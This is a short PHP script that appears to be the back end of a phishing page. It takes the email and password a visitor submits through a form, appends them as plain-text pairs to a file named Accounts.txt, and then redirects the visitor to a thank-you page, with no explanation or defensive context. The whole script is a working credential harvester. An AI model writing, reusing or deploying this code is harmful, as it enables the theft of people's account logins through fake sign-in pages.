<?php
					  $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
					  $fp = fopen("Accounts.txt", "a");
					  fwrite($fp, "$_POST[mail]:$_POST[pass] \n ");
					  header ("location:thanks.html");
					  ?>